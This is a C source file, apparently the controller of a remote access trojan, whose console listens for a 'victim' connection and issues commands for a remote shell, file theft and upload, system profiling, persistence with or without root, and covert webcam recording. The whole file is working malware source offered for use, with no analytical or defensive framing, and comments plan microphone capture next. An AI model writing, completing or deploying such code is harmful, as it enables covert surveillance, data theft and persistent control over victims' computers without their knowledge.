#include <stdio.h> 
#include <stdlib.h> 
#include <sys/types.h> 
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <netinet/in.h>  
#include <sys/socket.h>  
#include <unistd.h>
#include <arpa/inet.h> 
#include <libgen.h>
#include <locale.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "../src/base64.c"

// Eliminar los .ppm del cliente..
// API de ALSA para acceder al micrófono y la API de Video4Linux para acceder a la cámara.

int serverSock;
int targetConn;

// Definiciones
#define SOCKBUFFER 2048

//Colores
const char *GREEN = "\033[0;32m\033[1m";
const char *end = "\033[0m\033[0m";
const char *RED = "\033[0;31m\033[1m";
const char *BLUE = "\033[0;34m\033[1m";
const char *YELLOW = "\033[0;33m\033[1m";
const char *PURLPLE = "\033[0;35m\033[1m";
const char *CYAN = "\033[0;36m\033[1m";
const char *GRAY = "\033[0;37m\033[1m";

// Prototipo
char *replaceFile(char *command, char *toReplace);
char* decodeSystemInformation(char *codedSysInfo);
char* getSystemInformation(int targetConn, char *command);
int mainFunction(int targetConn, char *clientIP, uint16_t clientPort);
int recvVideoData(char *command, int targetConn, char *clientIP);
int readSendFile(int targetConn, char *filename, char *instruct);
int shell(int targetConn, char *clientIP, uint16_t clientPort);
int downloadFunc(char *command, int targetConn, char *ip); 
int writeAndDecodeData(char *data, char *file, char *ip);
int setPersistence(int targetConn, char *command);
int sndAndExecCmd(int targetConn, char *command);
int startServer();
long get_file_size(char* filename);
void closeConection(int targetConn, char *command, size_t instructLen, char *clientIP, uint16_t clientPort);
void StartGetSysInfo(int targetConn, char *command);
void StartGetSysInfo(int targetConn, char *command);
void StartSending(int targetConn, char *instruct);
void printProgressBar(long current, long total);
void checkStart(char *IPAddress);
void ctrlCHandler(int sig);
void helpPannel();

void ctrlCHandler(int sig) {
    // Exit ctrl + c 
    printf("\n\n\t%s[!] %sSaliendo: Ctrl + C detectado... %s\n", RED, YELLOW, end);
    close(serverSock);
    exit(1);
}

long get_file_size(char* filename) {
    struct stat file_status;
    if (stat(filename, &file_status) < 0) {
        return -1;
    }
    return file_status.st_size;
}

void closeConection(int targetConn, char *command, size_t instructLen, char *clientIP, uint16_t clientPort){
    char formattedString1[50] = "";
    snprintf(formattedString1, sizeof(formattedString1), " %s-%u ", clientIP, clientPort);
    printf("\n\t%s[*>] %s Closing Connection to  %s ===> %s %s\n\n", YELLOW, RED, end, formattedString1, YELLOW); 
    send(targetConn, command, instructLen, 0);
    sleep(0.2);
    shutdown(targetConn, SHUT_RDWR);
    shutdown(serverSock, SHUT_RDWR);
    close(targetConn);
    close(serverSock);
}

void checkStart(char *IPAddress){
    char formed[SOCKBUFFER];
    char formed1[SOCKBUFFER];
    snprintf(formed, SOCKBUFFER, "./DATA/%s", IPAddress);
    snprintf(formed1, SOCKBUFFER, "./DATA/%s/video", IPAddress);
    struct stat buffer;
    if (stat("./DATA", &buffer) != 0) {
        mkdir("./DATA", 0700); 
    }
    if (stat(formed, &buffer) != 0){
        mkdir(formed, 0700);   
    }
    if (stat(formed1, &buffer) != 0){
        mkdir(formed1, 0700);   
    }
    
   
}

void helpPannel(){
    printf("\n\tAvailable Commands:\n\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] shell                 -> Enter Shell Mode \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] exec <command>        -> Execute commands on NO shell mode \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] check                 -> Check privileges \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] download <file>       -> Download from target \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] upload <file>         -> Upload local file to target\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] sysinfo               -> Show info from system target\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] lowpersistence        -> Set a low mode of persistence (no root)\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] persistence           -> Set a high mode of persistence (root)\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] video                 -> Take a 10s video (1280x720p)\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] q / exit              -> Exit the conection\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] q -y / exit -y        -> Terminate the conection (close victim binary)\n");
    printf("\t\t---------------------------------------------------------\n");

}

void StartSending(int targetConn, char *instruct){
    char *filename = replaceFile(instruct, "upload ");
    readSendFile(targetConn, filename, instruct);

}

int readSendFile(int targetConn, char *filename, char *instruct){
    send(targetConn, instruct, strlen(instruct), 0); 
    long fullBytes = get_file_size(filename);

    if (fullBytes == -1){
        printf("\n\t%s[!>] %sNo se puede abrir el archivo.\n\n", RED, YELLOW);       
        send(targetConn, "end\0", strlen("end\0"), 0);
        return 1;
    }

    FILE *fp;
    fp = fopen(filename, "rb");

    unsigned char readData[SOCKBUFFER];
    long fullReaded;
    long bytesRead;
    printf("\n");

    while (true){
        if ((bytesRead = fread(readData, 1, 2047, fp)) <= 0)
            break;

        readData[bytesRead] = '\0';
        send(targetConn, (char *)readData, bytesRead, 0);
        memset(readData, 0, SOCKBUFFER);
        fullReaded += bytesRead;
        
        printProgressBar(fullReaded, fullBytes);
        
    }

    printf("\n");
    fclose(fp);
    sleep(0.3);
    send(targetConn, "end\0", strlen("end\0"), 0); 
    printf("\n\t%s[*>] %sFile Uploaded Successfully.\n\n", YELLOW, BLUE);
    return 0;

}

int sndAndExecCmd(int targetConn, char *command){
    char resp[SOCKBUFFER];
    memset(resp, 0, sizeof(resp));
    // Enviar comando
    send(targetConn, command, strlen(command), 0);
    
    while (true) {
        recv(targetConn, resp, SOCKBUFFER, 0);
        if (strcmp(resp, "end\0") == 0){
            break;
            
        } else {
            printf("%s\n", resp);
            memset(resp, 0, SOCKBUFFER);

        }
    }
    memset(resp, 0, SOCKBUFFER);
    return 0;
}

int shell(int targetConn, char *clientIP, uint16_t clientPort){
    printf("\n\t%s[*>] %sEntering Shell Mode%s\n\n", YELLOW, BLUE, end);
    send(targetConn, "shell", strlen("shell"), 0);

    char command[255] = "";
    char resp[SOCKBUFFER];
    while (true) {
        
        printf("\n%s<*%s Shell %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
        fgets(command, sizeof(command), stdin); 

        // Eliminar el carácter de nueva línea si está presente
        size_t command_len = strlen(command);
        if (command_len > 0 && command[command_len - 1] == '\n') {
            command[command_len - 1] = '\0';
        }

        // Enviar el mensaje:
        if (strcmp(command, "q") == 0){ 

            printf("\n\t%s[*>] %sExiting Shell mode\n\n%s", YELLOW, BLUE, end);
            send(targetConn, command, sizeof(command), 0);
            break;

        } else if (strstr(command, "exit") != NULL){ 
            printf("\n\t%s[!>] %s For exit shell mode type 'q'\n", RED, YELLOW);

        } else if (strlen(command) == 0){
            continue;
            //send(targetConn, ":", sizeof(command), 0); 
        } else{
            sndAndExecCmd(targetConn, command);
        }
    }    
    return 0;

}


char *replaceFile(char *command, char *toReplace){
    char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'

    char *substr = strstr(command, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    file[remainingLength] = '\0'; 

    return file;
}

int downloadFunc(char *command, int targetConn, char *ip){
    send(targetConn, command, strlen(command), 0);

    char formed[500];
    snprintf(formed, SOCKBUFFER, " check path -> ./DATA/%s", ip);

    // Tamaño máximo del archivo 
    char bytesStr[100];
    recv(targetConn, bytesStr, 100, 0);
    long fullBytes;
    fullBytes = atoi(bytesStr);

    if (fullBytes == -1){
        printf("\n\t%s[*>] %sError Downloading file\n", RED, YELLOW);
        return 1;
    }

    // Encontrar nombre de base (NO RUTA COMPLETA)
    
    char *base = basename(replaceFile(command, "download "));
    printf("\n\t%s[*>] %sDownloading file %s %s%s %s\n\n", YELLOW, BLUE, YELLOW, base, BLUE, formed);

    // Preparar el bucle de recepción de datos
    snprintf(formed, SOCKBUFFER, "./DATA/%s/%s", ip, base);  
    FILE *fp;
    fp = fopen(formed, "wb");
    unsigned char recvData[SOCKBUFFER];
    int bytesReadCurrent = 0;
    size_t bytesRead = 0;


    while (true){
        bytesReadCurrent = recv(targetConn, (char *)recvData, SOCKBUFFER, 0);
        
        if (bytesReadCurrent < 2000){
            printf("\n%d", bytesReadCurrent);
            fwrite(recvData, 1, bytesReadCurrent, fp);
            memset(recvData, 0, SOCKBUFFER);            
            break;
        }
        
        fwrite(recvData, 1, bytesReadCurrent, fp);
        bytesRead += bytesReadCurrent;
        printProgressBar(bytesRead, fullBytes);
        memset(recvData, 0, SOCKBUFFER);
    
    }

    fclose(fp);

}

char* getSystemInformation(int targetConn, char *command){
    send(targetConn, command, strlen(command), 0);
    char* recvData = malloc(SOCKBUFFER);

    while (true){
        recv(targetConn, recvData, SOCKBUFFER, 0);
        if (strstr(recvData, "end\0") == 0)
            break;
        else 
            printf("%s", recvData);
            continue;
        
    }

    return recvData;
}

char* decodeSystemInformation(char *codedSysInfo){
    long input_size = strlen(codedSysInfo) ;    
    char* decodedSystemInfo = base64_decode(codedSysInfo, input_size, &input_size);
    return decodedSystemInfo;
}

void StartGetSysInfo(int targetConn, char *command){
    char *codedSysInfo = getSystemInformation(targetConn, command);
    printf("%s\n", decodeSystemInformation(codedSysInfo));

}

int setPersistence(int targetConn, char *command){
    send(targetConn, command, strlen(command), 0);
    char* recvData = malloc(SOCKBUFFER);  

    recv(targetConn, recvData, SOCKBUFFER, 0);

    if (strcmp(command, "lowpersistence") == 0){
        if (strcmp("error", recvData) == 0){
            printf("\n\n\t%s[!>] %sError getting low persistence...\n\n%s", RED, YELLOW, end);
        }
        else if (strcmp("exito", recvData) == 0){
            printf("\n\n\t%s[*>] %sLow persistence setted succsessfully...\n\n%s", YELLOW, BLUE, end);    
        }
    }

    if (strcmp(command, "persistence") == 0){
        if (strcmp("error", recvData) == 0){
            printf("\n\n\t%s[!>] %sError getting high persistence...\n\n%s", RED, YELLOW, end);  
        
        } else if (strcmp("exito", recvData) == 0){
            printf("\n\n\t%s[*>] %sHigh persistence setted succsessfully...\n\n%s", YELLOW, BLUE, end);

        } else if (strcmp("permissonError", recvData) == 0){
            printf("\n\t%s[!>] %sError setting persistence, PermissonError...\n", YELLOW, BLUE);
        
        }
    }

    free(recvData);
    return 0;
}

int checkPermissons(int targetConn, char *command){
    send(targetConn, command,  strlen(command), 0);
    char* recvData = malloc(SOCKBUFFER);  

    recv(targetConn, recvData, SOCKBUFFER, 0);
    if (strstr(recvData, "yes") != NULL){
        printf("\n\t%s[*>] %sAdmin Privileges...\n%s", YELLOW, BLUE, end); 
    
    } else if (strstr(recvData, "no") != NULL){
        printf("\n\t%s[*>] %sUser Privileges...\n%s", YELLOW, BLUE, end); 
    } 

    free(recvData);
    return 0;
}


void printProgressBar(long current, long total) {
    int barWidth = 50;
    float progress = (float)current / total;
    int pos = (int)(barWidth * progress);

    printf("\t%s[%s", YELLOW, end);
    for (int i = 0; i < barWidth; i++) {
        if (i < pos) {
            printf("%s▓%s", GREEN, end); // Carácter de progreso
        } else {
            printf(" "); // Espacio en blanco para el fondo
        }
    }
    printf("%s]%s %.2f%%", YELLOW, end, progress * 100);

    // Agregar un retorno de carro para volver al principio de la línea
    printf("\r");
    fflush(stdout);
}


int recvVideoData(char *command, int targetConn, char *clientIP) {
    printf("\n\n%s[*>] %sStarting video capture, wait (10 Secs aprox.)\n", YELLOW, BLUE);
    send(targetConn, command, strlen(command), 0);
    char recvData[SOCKBUFFER];
    memset(recvData, 0, SOCKBUFFER);

    char formed[SOCKBUFFER];
    snprintf(formed, SOCKBUFFER, "./DATA/%s/video/frames.tar", clientIP);

    FILE *fp = fopen(formed, "wb");

    // Recive weight of file
    char fullBytesStr[100];
    memset(fullBytesStr, 0, 100);
    recv(targetConn, fullBytesStr, 100, 0); 

    if (strstr(fullBytesStr, "no-cam")){
        fclose(fp);
        printf("\n\t%s[!>] %sNo camera devices found...%s\n", YELLOW, RED, end);
        return 1;
    }

    // transform str to int
    long fullBytes = atoi(fullBytesStr);
    double megabytes = (double)fullBytes / 1048576;
    

    printf("\n\t%s[*>] %sReciving Compressed File...%s [%.2f MB]\n\n", RED, YELLOW, end, megabytes); 

    long recvBytes = 0;

    while (true){
        int rcBytes = recv(targetConn, recvData, SOCKBUFFER, 0); 
        long size = rcBytes;
        fflush(stdout); 
        //printf("Reciving: %s\r", recvData);

        if (strcmp(recvData, "ending\0") == 0){  
            fflush(stdout);
            break;
        }

        else
            fwrite(recvData, 1, rcBytes, fp);
            //fprintf(fp, "%s", base64_decode(recvData, size, &size));
                
        recvBytes = recvBytes + rcBytes;
        printProgressBar(recvBytes, fullBytes);
        memset(recvData, 0, 2048);

    }
    printf("\n");
    memset(formed, 0, SOCKBUFFER);
    fclose(fp); 

    // Descomprimimos el archivo .tar
    snprintf(formed, SOCKBUFFER, "tar -xf ./DATA/%s/video/frames.tar -C ./DATA/%s/video/", clientIP, clientIP);
    system(formed);

    memset(formed, 0, SOCKBUFFER);
    
    // Montamo video a partirde .ppm
    snprintf(formed, SOCKBUFFER, "ffmpeg -y -framerate 24 -i ./DATA/%s/video/tmp/out%%03d.ppm -c:v libx264 -crf 25 -vf 'scale=1280:720,format=yuv420p' -movflags +faststart ./DATA/%s/video/recVideo.mp4", clientIP, clientIP);
    system(formed);
    
    printf("\n\n%s[*>] %sVideo mounted and recived succsessfully %s[./DATA/%s/video/] %s\n", YELLOW, RED, YELLOW, clientIP, end);
    return 0; 
}


int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
    char command[255] = "";
    char resp[SOCKBUFFER];
    checkStart(clientIP);
    while (true){
        printf("\n%s<*%s C&C %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
        fgets(command, sizeof(command), stdin); 

        // Eliminamos "\n" del final
        size_t instructLen = strlen(command);
        if (instructLen > 0 && command[instructLen -1] == '\n'){
            command[instructLen - 1] = '\0';
        }

        if (strcmp(command, "exit") == 0 || strcmp(command, "q") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;
            
        } else if(strcmp(command, "exit -y") == 0 || strcmp(command, "q -y") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;

        } else {
            // Panel de ayuda
            if (strcmp(command, "help") == 0){
                helpPannel(); 

            // Descargar un archivo    
            } else if (strstr(command, "download") != NULL)
                downloadFunc(command, targetConn, clientIP);
            
            else if (strcmp(command, "shell") == 0)
                shell(targetConn, clientIP, clientPort);
            
            else if (strstr(command, "exec") != NULL)
                sndAndExecCmd(targetConn, command);
                
            else if(strstr(command, "upload") != NULL)
                StartSending(targetConn, command);

            else if(strcmp(command, "sysinfo") == 0)
                StartGetSysInfo(targetConn, command);
                
            else if (strcmp(command, "lowpersistence") == 0)
                setPersistence(targetConn, command);
            
            else if (strcmp(command, "persistence") == 0)
                setPersistence(targetConn, command);

            else if (strcmp(command, "check") == 0)
                checkPermissons(targetConn, command);

            else if (strcmp(command, "video") == 0)
                recvVideoData(command, targetConn, clientIP);

            else
                printf("\n\t%s[!>]%s Instruct Not Known...\n", RED, YELLOW);
            
        }
    }
}

int startServer(){

    // Creamos el socket del cliente
    serverSock = socket(AF_INET, SOCK_STREAM, 0);
    
    int enable = 1;
    if (setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0)
            perror("setsockopt(SO_REUSEADDR) failed");

    // Definimos el client addres
    struct sockaddr_in servAddr;

    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(9000);
    servAddr.sin_addr.s_addr = INADDR_ANY;

    // Escuchamos en la IP y puerto:
    bind(serverSock, (struct sockaddr*)&servAddr,
                sizeof(servAddr));

    // Escuchamos para conexiones
    listen(serverSock, 1);

    // Integer para mantener el socket cliente
    targetConn = accept(serverSock, NULL, NULL);

    // Obtenemos la dirección IP del cliente
    struct sockaddr_in clientAddr;
    socklen_t clientAddrLen = sizeof(clientAddr);
    getpeername(targetConn, (struct sockaddr*)&clientAddr, &clientAddrLen);

    char clientIP[INET_ADDRSTRLEN];  // String para almacenar la dirección IP
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
    // Obtenemos el puerto del cliente
    uint16_t clientPort = ntohs(clientAddr.sin_port);

    printf("\t%s[>]%s New Connection From: %s %s-%u\n", YELLOW, RED, end, clientIP, clientPort);

    mainFunction(targetConn, clientIP, clientPort);
    

}

int main(int argc, char const* argv[]){
    // Atrapamos ctrl + c 
    if (signal(SIGINT, ctrlCHandler) == SIG_ERR) {
        perror("Error al configurar el manejador de señales");
        exit(EXIT_FAILURE);
    }

    printf("%s\n[!>] %sWaiting For target to connect...%s\n\n", YELLOW, RED, end); 
    startServer();
    return 0;

}

